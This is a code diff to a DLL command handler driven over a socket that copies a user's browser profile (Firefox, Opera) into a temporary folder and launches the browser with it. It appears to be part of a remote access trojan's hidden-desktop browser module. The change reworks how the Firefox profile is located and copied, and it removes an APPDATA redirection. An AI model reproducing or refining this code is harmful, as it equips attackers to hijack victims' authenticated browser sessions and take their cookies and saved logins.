@@ -2164,13 +2164,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     wstring profilePath;
                     wstring profileDir = L"Default";
-                    bool appdataRedirected = false;
-                    wstring originalAppdata = L"";
-
-                    wchar_t envAppdata[32768];
-                    if (GetEnvironmentVariableW(L"APPDATA", envAppdata, 32768) > 0) {
-                        originalAppdata = envAppdata;
-                    }
 
                     if (copyProfile) {
                         wstring sourceUserData;
@@ -2202,19 +2195,22 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         } catch (...) {}
 
                         if (isGecko) {
-                            wstring destPath = tempProfileRoot + L"\\Mozilla\\Firefox";
-                            if (!copy_profile_parallel(sourceUserData, destPath, "Profiller kopyalanıyor")) {
-                                send_error("Failed to copy browser profile.");
-                                return;
+                            wstring realActiveProfile = get_firefox_real_profile_path(sourceUserData);
+                            if (realActiveProfile.empty()) {
+                                realActiveProfile = find_gecko_profile_fallback(sourceUserData);
                             }
-                            profilePath = get_firefox_real_profile_path(destPath);
-                            if (profilePath.empty()) {
-                                profilePath = find_gecko_profile_fallback(destPath);
+                            if (!realActiveProfile.empty() && fs::exists(realActiveProfile)) {
+                                if (!copy_profile_parallel(realActiveProfile, tempProfileRoot, "Profiller kopyalanıyor")) {
+                                    send_error("Failed to copy browser profile.");
+                                    return;
+                                }
+                            } else {
+                                if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
+                                    send_error("Failed to copy browser profile.");
+                                    return;
+                                }
                             }
-
-                            // Redirect APPDATA environment variable
-                            SetEnvironmentVariableW(L"APPDATA", tempProfileRoot.c_str());
-                            appdataRedirected = true;
+                            profilePath = tempProfileRoot;
                         } else {
                             if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
                                 send_error("Failed to copy browser profile.");
@@ -2274,7 +2270,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring args;
                     if (isGecko) {
                         args = L" -no-remote -allow-downgrade";
-                        if (!appdataRedirected && !profilePath.empty()) {
+                        if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
                         }
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
@@ -2404,9 +2400,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     if (isGecko) {
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
-                        if (appdataRedirected) {
-                            SetEnvironmentVariableW(L"APPDATA", originalAppdata.empty() ? NULL : originalAppdata.c_str());
-                        }
                     }
 
                     if (hCurrentDesktop) {
